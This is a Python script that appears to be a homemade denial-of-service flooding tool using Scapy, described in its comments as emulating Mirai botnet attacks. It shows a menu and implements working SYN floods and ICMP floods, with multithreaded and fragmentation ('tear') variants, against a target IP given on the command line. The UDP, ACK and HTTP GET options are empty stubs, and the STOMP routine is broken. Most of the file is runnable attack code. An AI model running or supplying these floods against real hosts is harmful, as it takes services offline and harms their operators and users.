#!/usr/bin/env python3
import sys, time, random, os, socket, argparse, ipaddress, threading, multiprocessing
from scapy.all import *


# This was developed with the purpose of emulating the attacks performed by the MIRAI worm:
#https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack_tcp.c
# This should include those found on Mirai and other attacks that may be possible to observe being executed by other botnets

#https://github.com/ep4sh/pyddos
#https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py
#https://github.com/vodkabears/synflood/blob/master/synflood.py
#https://security.radware.com/ddos-knowledge-center/ddospedia/

# Arguments specification
parser = argparse.ArgumentParser()
#parser.add_argument("-d", "--dst_ip", help="Specify a target destination IP address")
parser.add_argument("dst_ip", help="Specify a target destination IP address")
parser.add_argument("-s", "--src_ip", help="Specify a source IP address. Default is random.")
parser.add_argument("-p", "--powerflood", help="Uses multithreading for concurrent floods.", action="store_true")
parser.add_argument("-f", "--fragmentation", help="Uses fragmentation for 'TEARING'-type floods OR meeting MTU requirements. '-p' option ignores this.", action="store_true")
parser.add_argument("-t", "--interval", type=float, help="Specify a time interval between packets (in seconds). Default is 0.")
parser.add_argument("-dp", "--dport", help="Specify a destination Port. Default is random.")
parser.add_argument("-sp", "--sport", help="Specify a source Port. Default is random.")
parser.add_argument("-r", "--repeat", type=int, help="Specify a number of packets to send. Default is 0. Set 0 to unlimited. ('Power', '-p' option ignores this value)")
args = parser.parse_args()


#src_ip = ".".join(map(str, (random.randint(0,254)for i in range(4)))) if args.src_ip is None else args.src_ip # This generator includes any reserved address spaces. As of now, Scapy's built-in generator is being used, although it may be slower or power-consuming than manual generation.
src_ip = RandIP() if args.src_ip is None else args.src_ip
dst_ip = args.dst_ip # Implement address verification

dport = 0 if args.dport is None else args.dport
sport = 0 if args.sport is None else args.sport

power = args.powerflood

frag = args.fragmentation

src_desc = "[random]" if args.src_ip is None else str(args.src_ip)
target_desc = str(dst_ip)

repeat = 0 if args.repeat is None else args.repeat

interval = 0 if args.interval is None else args.interval

def main():
	print("\nSource: %s\nTarget: %s" %(src_desc, dst_ip))
	print(r'''                                                            
		      ██████  ██░ ██  ██▀███  ▓█████  ██ ▄█▀
		    ▒██    ▒ ▓██░ ██▒▓██ ▒ ██▒▓█   ▀  ██▄█▒ 
		    ░ ▓██▄   ▒██▀▀██░▓██ ░▄█ ▒▒███   ▓███▄░ 
		      ▒   ██▒░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ 
		    ▒██████▒▒░▓█▒░██▓░██▓ ▒██▒░▒████▒▒██▒ █▄
		    ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒
		    ░ ░▒  ░ ░ ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░
		    ░  ░  ░   ░  ░░ ░  ░░   ░    ░   ░ ░░ ░ 
		        ░   ░  ░  ░   ░        ░  ░░  ░   
		                                        
                           ▄████████  ▄█   ▄██████▄                              
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                         ▀███████████ ███▌ ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    █▀  █▀    ▀██████▀                              
   ▄████████  ▄█        ▄██████▄   ▄██████▄  ████████▄     ▄████████    ▄████████ 
  ███    ███ ███       ███    ███ ███    ███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀  ███       ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄     ███       ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀     ███       ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███        ███       ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████ 
  ███        ███▌    ▄ ███    ███ ███    ███ ███   ▄███   ███    ███   ███    ███ 
  ███        █████▄▄██  ▀██████▀   ▀██████▀  ████████▀    ██████████   ███    ███ 
             ▀                                                         ███    ███ 


			  #############################
			  #      OPTIONS MENU:        #
			  #############################
			  # 1) SYN   Flood            #
			  # 2) UDP   Flood            #
			  # 3) ACK   Flood            #
			  # 4) STOMP Flood            #
			  # 5) GET   Flood (HTTP)     #
			  # 6) ICMP  Flood (echo-req) #
			  # 7) UDP   Flood (Plain)    #
			  #                           #
			  # 0) Exit                   #
			  ############################# 
	  ''')

	choice = input("Select Flood type:\n>>")

	if choice == '1':
		if not power: synFlood(src_ip,dst_ip,repeat,sport,dport,interval,False) 
		else: powerSynFlood(src_ip,dst_ip,repeat,sport,dport,interval,True)
	elif choice == '2':
		udpFlood()
	elif choice == '3':
		ackFlood()
	elif choice == '4':
		stompFlood()
	elif choice == '5':
		getFlood()
	elif choice == '6':
		if not power: pingFlood(src_ip,dst_ip,repeat,interval,False)
		else: multiPingFlood(src_ip,dst_ip,repeat,interval,True)
	elif choice == '7':
		udpPlainFlood()
	elif choice == '0':
		exit()
	else:
		print("Oopsies, try again..")
		main()
	return 0

#https://scapy.readthedocs.io/en/latest/usage.html
#https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html

def synFlood(src,dst,times,sport,dport,inter,power):
	if power:
		print("Multithreaded SYN Flood!")
		while 1:
			packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort(), seq=random.randint(1,9999), window=random.randint(1,9999))
			send(packet, verbose=0)
			
	else:
		print("SYN Flood started!")
		if times != 0:
			print("Flooding %s:%d with %d packets.." % (dst,dport,times))
			tic = time.clock()
			if sport == 0 & dport != 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=int(dport))
				send(packet, verbose=0, count=times, inter=inter)
			elif dport == 0 & sport != 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=int(sport),  dport=RandShort())
				send(packet, verbose=0, count=times, inter=inter)
			elif  sport == 0 & dport == 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort())
				send(packet, verbose=0, count=times, inter=inter)
			else:
				packet = IP(dst=dst)/TCP(flags="S",  sport=int(sport),  dport=int(dport))
				send(packet, verbose=0, count=times, inter=inter)
			toc = time.clock() - tic
			print("Flood ended (dur: %f)" % toc)
		else:
			packet = IP(dst=dst)/TCP(flags="S",  sport=int(sport),  dport=int(dport))
			send(packet, loop=1, verbose=0, inter=inter)
			print("\nFlood ended")
	return 0

def powerSynFlood(src,dst,times,sport,dport,inter,power):
	power = True
	cpu_count = multiprocessing.cpu_count()
	try:		
		print("Starting multithreaded SYN Flood. Using %s threads" % cpu_count)
		for i in range(0,cpu_count):
			thread = threading.Thread(target=synFlood,args=(src,dst,times,sport,dport,inter,power))
			thread.start()
	except KeyboardInterrupt:
		for i in range(cpu_count):
			thread = threading.Thread(target=synFlood,args=(src,dst,times,sport,dport,inter,power))
			thread.stop()
			thread.kill()


def udpFlood():

	return 0

def udpPlainFlood():

	return 0

# The MTU should be considered; 1500B is maximum for general purpose networks (https://pt.wikipedia.org/wiki/MTU)
def pingFlood(src,dst,times,inter,power):#ICMP echo request Flood (aka Ping of Death)
	#https://www.ietf.org/rfc/rfc0792.txt
	#https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html
	global frag
	# 'POWER' flag set
	if power:
		# Flag bit -> 1 = Dont Fragment; 2 = More Fragments (https://en.wikipedia.org/wiki/IPv4#Flags) HOWEVER! -> Scapy flag 1 is actually MF and flag 2 is DF!!!
		print("Multithreaded ICMP Flood")
		p=IP(dst=dst, flags=2, frag=0)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
		send(p, verbose=0, loop=1, inter=inter)
	# 'FRAG' flag set
	elif frag:
		# Fragmentation / TEAR attack (ICMP & UDP) -> Scapy flag 1 is actually MF and flag 2 is DF!!!
		print("Using fragmentation ICMP Flood..")
		if times != 0:
			for i in range (0,times):
				p=IP(dst=dst, flags=1, id=RandShort(), frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
				send(p, verbose=0, inter=inter) 
		while 1:
			p=IP(dst=dst, flags=1, id=RandShort(), frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
			send(p, verbose=0, inter=inter)
	# Regular, no flags set
	else:
		if times != 0:
			p=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
			send(p, verbose=1, count=times, inter=inter) # count=times OR for i in [0,times]?
		else:
			p=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
			send(p, verbose=1, loop=1, inter=inter) # count=times OR for i in [0,times]?
	return 0


def multiPingFlood(src,dst,times,inter,power):
	cpu_count = multiprocessing.cpu_count()
	try:		
		print("Starting multithreaded ICMP (echo-reply) Flood. Using %s threads" % cpu_count)
		for i in range(0,cpu_count):
			thread = threading.Thread(target=pingFlood,args=(src,dst,times,inter,power))
			thread.start()
	except KeyboardInterrupt:
		for i in range(cpu_count):
			thread = threading.Thread(target=pingFlood,args=(src,dst,times,inter,power))
			thread.stop()
			thread.kill()


def ackFlood():

	return 0

def stompFlood(dst,times,dport):
	# Same as ACK Flood but establishes TCP 3-way Handshake first
	mysocket=socket.socket()
	mysocket.connect((dst,dport))
	mystream=StreamSocket(mysocket)
	packet = ""
	mystream.send(packet)

	return 0

def getFlood():

	return 0


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		sys.exit("\nGET SHREKT")